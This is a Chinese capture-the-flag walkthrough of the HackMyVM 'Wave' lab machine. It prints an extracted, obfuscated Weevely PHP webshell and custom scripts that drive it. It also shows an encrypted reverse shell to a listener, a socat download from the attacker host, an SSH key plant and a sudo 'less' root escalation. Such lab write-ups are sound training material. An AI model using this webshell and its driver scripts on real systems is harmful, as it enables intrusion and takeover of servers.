# hmv_Wave

# 0.简介

**靶机**：[hackmyvm - Wave](https://hackmyvm.eu/machines/machine.php?vm=Wave)
**难度**：黄色
**目标 IP**：192.168.205.138
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 18:30 CST
Nmap scan report for 192.168.205.138
Host is up (0.00029s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5555/tcp open  freeciv
MAC Address: 08:00:27:37:83:76 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.58 seconds
```

去80看看web页面

# 2.踩点

![Image](https://github.com/user-attachments/assets/fc213d31-5792-4ec3-bc4f-f8ddc75839bb)

爆破目录

```bash
┌──(kali㉿kali)-[~/test]
└─$ feroxbuster -u "http://192.168.205.138/" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md 
                                                                                                                                  
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.205.138/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, md]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                 
200      GET        3l        5w       32c http://192.168.205.138/backup/phptest.bck
200      GET        3l        6w       31c http://192.168.205.138/backup/index.bck
200      GET        2l        1w        4c http://192.168.205.138/backup/log.log
200      GET        1l        2w       18c http://192.168.205.138/backup/robots.bck
200      GET        2l       13w      833c http://192.168.205.138/backup/weevely.bck
200      GET        3l        6w       31c http://192.168.205.138/
301      GET        7l       11w      169c http://192.168.205.138/backup => http://192.168.205.138/backup/
200      GET        3l        6w       31c http://192.168.205.138/index.html
200      GET        1l        2w       18c http://192.168.205.138/robots.txt
200      GET        1l        2w       11c http://192.168.205.138/phptest.php
[####################] - 48s   311445/311445  0s      found:10      errors:0    
[####################] - 47s   311410/311410  6566/s  http://192.168.205.138/ 
[####################] - 0s    311410/311410  77852500/s http://192.168.205.138/backup/ => Directory listing (add --scan-dir-listings to scan)                           
```

探索一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138/backup/phptest.bck
<?php
print ("HELLO WORLD");
?>
                                                                                                                                
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138/backup/index.bck  
<h1> WAVE </h1>

<!-- wAvE -->
                                                                                                                                
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138/backup/log.log  
OK

                                                                                                                                
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138/backup/robots.bck
Disallow: /backup
                                                                                                                                
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138/backup/weevely.bck
Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to output it to your terminal anyway, or consider 
Warning: "--output <FILE>" to save to a file.
```

找到了一个文件，我们下载下来看看

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138/backup/weevely.bck -o /tmp/weevely.bck
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   515  100   515    0     0   217k      0 --:--:-- --:--:-- --:--:--  251k
                                                                                                                                
┌──(kali㉿kali)-[~/test]
└─$ cd tmp                                                      
                                                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/test/tmp]
└─$ cat weevely.bck                
<?php include "\160\x68\141\x72\72\57\57".basename(__FILE__)."\57\x78";__HALT_COMPILER(); ?>/x�X���U��j�0ſ�)J�hB�S;���
                                                                                                                      �/�J��▒m�.��)��n�(▒��"`�=6�&T�YE�p��(�q1���a'H�Pq6�.���v���/��8�ĳe��$+��s�"����5�|��H�� O����w�2%��OyTV���Q�b�A���h��=�W {��
�kЛw8�a����S�����
�fBLXx  ���Ϝ����v����m���%#,H��R#2HJ]�t�|*��������h�Ms��
                       ږ&'��Y���P��B��lXw�l�e���E!S�He�2�p�7G�[N��=�-��Ƀ�i�)�[��N����7��U_�=*��Ψ�s?c((VGBMB                                                                                                                                

```

部分内容显示乱码，但是我们通过可读的可以得知，可能是一个恶意后门，我们尝试恢复一下

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ file weevely.bck
weevely.bck: PHP phar archive with SHA1 signature
                                                                                                                                
┌──(kali㉿kali)-[~/test/tmp]
└─$ phar extract -f weevely.bck weevely.phpr
//home/kali/test/tmp/weevely.bck/x ...ok
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/test/tmp]
└─$ cat /home/kali/test/tmp/weevely.phpr/home/kali/test/tmp/weevely.bck/x 
<?php eval('$k="3ddf0d5c";$kh="b6e7a529b6c2";$kf="d598a771749b";$p="afnqDsRcBpVmU71y";

function x($t,$k){
$c=strlen($k);$l=strlen($t);$o="";
for($i=0;$i<$l;){
for($j=0;($j<$c&&$i<$l);$j++,$i++)
{
$o.=$t[$i]^$k[$j];
}
}
return $o;
}
if (@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1) {
@ob_start();
@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
$o=@ob_get_contents();
@ob_end_clean();
$r=@base64_encode(@x(@gzcompress($o),$k));
print("$p$kh$r$kf");
}');                                                                                                                                
```

确实是**Webshell 后门**，我们尝试利用一下

```bash
┌──(kali㉿kali)-[~/…/kali/test/tmp/weevely.bck]
└─$ cat tool.php 
<?php
$k = "3ddf0d5c";  // 密钥

function x($t, $k)
{
    $c = strlen($k);  // 密钥长度
    $l = strlen($t);  // 文本长度
    $o = "";

    // XOR 加密/解密
    for ($i = 0; $i < $l;)
    {
        for ($j = 0; ($j < $c && $i < $l); $j++, $i++)
        {
            $o .= chr(ord($t[$i]) ^ ord($k[$j]));
        }
    }
    return $o;
}

echo "选择操作：\n";
echo "1. 加密\n";
echo "2. 解密\n";
$choice = trim(fgets(STDIN));  // 获取用户输入

echo "请输入文本：\n";
$input_text = trim(fgets(STDIN));  // 获取要加密/解密的文本

if ($choice == 1) {
    // 加密
    echo "加密前的文本: " . $input_text . "\n";

    // 压缩文本
    $compressed_text = gzcompress($input_text);  // 压缩文本
    $encrypted_text = x($compressed_text, $k);   // XOR 加密
    echo "加密后的文本: " . base64_encode($encrypted_text) . "\n";  // 输出 Base64 编码后的加密文本
} elseif ($choice == 2) {
    // 解密
    $decoded_text = base64_decode($input_text);  // Base64 解码
    $decrypted_text = x($decoded_text, $k);      // XOR 解密
  
    // 解压缩
    $decompressed = @gzuncompress($decrypted_text);  // 解压缩，使用 @ 避免警告
  
    // 如果解压成功，则输出解压后的内容；否则输出解密后的内容
    if ($decompressed !== false) {
        echo "解密并解压后的文本: " . $decompressed . "\n";
    } else {
        echo "解密后的文本: " . $decrypted_text . "\n";
    }
} else {
    echo "无效的选项\n";
}
?>
```

加密和解密模块（解密模块是乱码，建议不用，或者自己改）。发送模块我们还差一个网址，我们之前用那个是备份文件，我们知道它的命名规则，那我们尝试爆破

```bash
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -c -u "http://192.168.205.138/weevelyFUZZ" -w /usr/share/seclists/Discovery/Web-Content/web-extensions-big.txt --hc 404   
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.138/weevelyFUZZ
Total requests: 66885

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000037:   200        0 L      0 W        0 Ch        ".php7"                                                             
000000248:   404        7 L      11 W       153 Ch      ".lOg"                                                              

Total time: 2.123899
Processed Requests: 246
Filtered Requests: 245
Requests/sec.: 115.8246


```

根据已知信息编写脚本

```bash
┌──(kali㉿kali)-[~/…/kali/test/tmp/weevely.bck]
└─$ cat request.py 
import requests
import base64

# 密钥 (与 PHP 脚本中的密钥一致)
kh = "b6e7a529b6c2"
kf = "d598a771749b"
p = "afnqDsRcBpVmU71y"

def main():
    # 输入要发送的字符串
    input_data = input("Enter the string to send: ")

    # 构造带有编码数据的请求体
    request_data = f"{kh}{input_data}{kf}"

    url = "http://192.168.205.138/weevely.php7"  # 请根据实际情况修改

    # 发送 POST 请求
    response = requests.post(url, data=request_data)

    # 打印响应报文
    print("Response:", response.text)

if __name__ == "__main__":
    main()

```

发送模块。我们尝试一下

```bash
┌──(kali㉿kali)-[~/…/kali/test/tmp/weevely.bck]
└─$ php tool.php
选择操作：
1. 加密
2. 解密
1
请输入文本：
system("ping -c2 192.168.205.141");
加密前的文本: system("ping -c2 192.168.205.141");
加密后的文本: S/hPyBxKfK7mNE6u/C9is35SNlaEUOdQB9e0VQJU4FAHVTC0hGI1ozptfA==

┌──(kali㉿kali)-[~/…/kali/test/tmp/weevely.bck]
└─$ python3 request.py
Enter the string to send: S/hPyBxKfK7mNE6u/C9is35SNlaEUOdQB9e0VQJU4FAHVTC0hGI1ozptfA==
Response: afnqDsRcBpVmU71yb6e7a529b6c2S/jp6f3u9yMj4Isfut49aVWaVqAvrEySgZxiVBbHOVl6KFMHTZ944ZQclbQEIWC05MOHiT+Q62uui+A3K8WYpUFCyNb58w7Y8YGh+OA4ZFpFRq2La91DLq87XUak1QjwTHJ+qr8GRRC72jSkqEkXHi5T197tvwT9lw2e5+7iz2VRo+VepOD08CvQytpLQkWEWe7lv2cPLReNkMV5R9FNGMMM7LBjd4Gx6rS3VxPib9nNQsedo9XHXjkoCy4V1mmqug38XPsihxwXSDrMd598a771749b
                                      
┌──(kali㉿kali)-[~/test]
└─$ sudo tcpdump -A -n icmp
[sudo] kali 的密码：
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
19:22:08.263760 IP 192.168.205.138 > 192.168.205.141: ICMP echo request, id 58412, seq 1, length 64
E..T..@.@..Z...........c.,.....g....p....................... !"#$%&'()*+,-./01234567
19:22:08.263782 IP 192.168.205.141 > 192.168.205.138: ICMP echo reply, id 58412, seq 1, length 64
E..T....@.\F...........c.,.....g....p....................... !"#$%&'()*+,-./01234567
19:22:09.276459 IP 192.168.205.138 > 192.168.205.141: ICMP echo request, id 58412, seq 2, length 64
E..T.(@.@..............1.,.....g............................ !"#$%&'()*+,-./01234567

```

运行正常，我们弹shell

```bash
┌──(kali㉿kali)-[~/…/kali/test/tmp/weevely.bck]
└─$ python3 request.py
Enter the string to send: S/hPyBxKfK7mNK4tZlSBV+FXUNXgVwdT5ldQV2TUNWE2uTBjzcD5X87AoIQ8QXgIM1fValA=

┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888             
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.138] 58888
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```bash
www-data@wave:~/html$ sudo -l  
[sudo] password for www-data: 
sudo: a password is required
www-data@wave:~/html$ ls -la
total 32
drwxr-xr-x 3 www-data www-data 4096 Sep  5  2023 .
drwxr-xr-x 3 root     root     4096 Sep  4  2023 ..
drwxr-xr-x 2 www-data www-data 4096 Sep  5  2023 backup
-rw-r--r-- 1 www-data www-data   31 Sep  4  2023 index.html
-rw-r--r-- 1 www-data www-data   32 Sep  4  2023 phptest.php
-rw-r--r-- 1 www-data www-data   18 Sep  4  2023 robots.txt
-rw-r--r-- 1 root     root      515 Sep  5  2023 weevely.bck
-rw-r--r-- 1 www-data www-data  515 Sep  5  2023 weevely.php7
www-data@wave:~/html$ cd /home/
www-data@wave:/home$ ls -al
total 16
drwxr-xr-x  4 root  root  4096 Sep  4  2023 .
drwxr-xr-x 18 root  root  4096 Sep  4  2023 ..
drwx------  4 angie angie 4096 Jan 18 10:40 angie
drwx------  2 carla carla 4096 Sep  4  2023 carla
www-data@wave:/home$ cd /opt/
www-data@wave:/opt$ ls -al
total 12
drwxr-xr-x  2 root root  4096 Sep  4  2023 .
drwxr-xr-x 18 root root  4096 Sep  4  2023 ..
-rwxrwxr--  1 root carla   46 Sep  4  2023 secret.txt
www-data@wave:/opt$ cat secret.txt 
Dietro di lui, 
dietro di lui solo la nebbia.
www-data@wave:/opt$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/su
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/newgrp
www-data@wave:/opt$ /sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
www-data@wave:/opt$ ss -tuln | grep tcp
tcp   LISTEN 0      1024       127.0.0.1:3923      0.0.0.0:*            
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*    
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*    
tcp   LISTEN 0      128             [::]:22           [::]:*    
tcp   LISTEN 0      511             [::]:80           [::]:*   
```

有个未知端口，我们转发一下

```bash
www-data@wave:~/html$ cd /tmp/
www-data@wave:/tmp$ wget 192.168.205.141/socat
--2025-01-18 13:20:09--  http://192.168.205.141/socat
Connecting to 192.168.205.141:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: 'socat'

socat                                                        0%[                                                                       socat                                                      100%[========================================================================================================================================>] 366.38K  --.-KB/s    in 0.003s  

2025-01-18 13:20:09 (105 MB/s) - 'socat' saved [375176/375176]

www-data@wave:/tmp$ chmod +x socat 
www-data@wave:/tmp$ ./socat TCP-LISTEN:1234,fork TCP4:127.0.0.1:3923 &
[1] 592
```

![Image](https://github.com/user-attachments/assets/74b5fd1f-838c-462a-acb9-576e7a15086e)

像个文件管理器，而且看样子它还是在家目录下，我们尝试上传一个密钥上去看看能不能一发入魂

```bash
mkdir .ssh
cd .ssh
ssh-keygen -t rsa 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): id_rsa
Enter passphrase (empty for no passphrase): 123456
Enter same passphrase again: 123456

┌──(kali㉿kali)-[~/test/.ssh]
└─$ ls -al
总计 20
drwxrwxr-x  3 kali kali 4096  1月18日 20:34 .
drwxrwxr-x 10 kali kali 4096  1月18日 20:31 ..
-rw-r--r--  1 kali kali  563  1月18日 17:40 authorized_keys
-rw-------  1 kali kali 2635  1月18日 17:40 id_rsa
drwxrwxr-x  2 kali kali 4096  1月18日 20:35 .ssh


┌──(kali㉿kali)-[~/test/.ssh]
└─$ ls -la .ssh/              
总计 12
drwxrwxr-x 2 kali kali 4096  1月18日 20:35 .
drwxrwxr-x 3 kali kali 4096  1月18日 20:34 ..
-rw-r--r-- 1 kali kali  563  1月18日 17:40 authorized_keys
                                                            
```

记得在里面再创建一个`.ssh`文件夹，并且把`id\_rsa.pub`改名为`authorized_keys`，然后打开你的文件管理器把`.ssh`（只有`authorized_keys`那个）文件夹**拖进去上传**

![Image](https://github.com/user-attachments/assets/a896ce7c-321b-4eb0-a253-bef4e2a7d01a)

```bash
┌──(kali㉿kali)-[~/test/.ssh]
└─$ ssh angie@192.168.205.138 -i id_rsa
The authenticity of host '192.168.205.138 (192.168.205.138)' can't be established.
ED25519 key fingerprint is SHA256:6XC0N82ZtO32MzrvGO7WaR/Yg+rpDa0Wkgoy3H8IdnE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.138' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Linux wave 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Sep  5 11:14:50 2023 from 192.168.0.100
angie@wave:~$ id
uid=1000(angie) gid=1000(angie) grupos=1000(angie),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)

```

尝试提权

```bash
angie@wave:~$ sudo -l
Matching Defaults entries for angie on wave:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User angie may run the following commands on wave:
    (ALL) NOPASSWD: /usr/bin/less -F /opt/secret.txt
angie@wave:~$ sudo /usr/bin/less -F /opt/secret.txt
Dietro di lui, 
dietro di lui solo la nebbia.

```

小窗提权？

![Image](https://github.com/user-attachments/assets/f85836de-c61b-43be-9851-7a6fb509c529)

还真是

```bash
root@wave:/home/angie# id
uid=0(root) gid=0(root) grupos=0(root)

```